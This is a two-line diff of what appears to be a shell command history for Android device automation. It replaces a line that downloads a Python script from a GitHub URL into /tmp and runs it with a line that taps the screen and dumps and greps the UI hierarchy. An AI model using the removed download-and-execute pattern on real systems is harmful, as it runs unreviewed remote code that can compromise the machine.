@@ -1,2 +1,2 @@
-shell "echo x"; curl -sL -o /tmp/sf.py 'https://raw.githubusercontent.com/zhaoyi-habs/mw-runner/main/shotfix.py'; python3 /tmp/sf.py b3
-#1792905885
+shell "logcat -c; input tap 961 891; sleep 5; uiautomator dump /sdcard/w9.xml >/dev/null 2>&1; grep -o 'text=[^ ]*' /sdcard/w9.xml | head -40"
+#1792905902
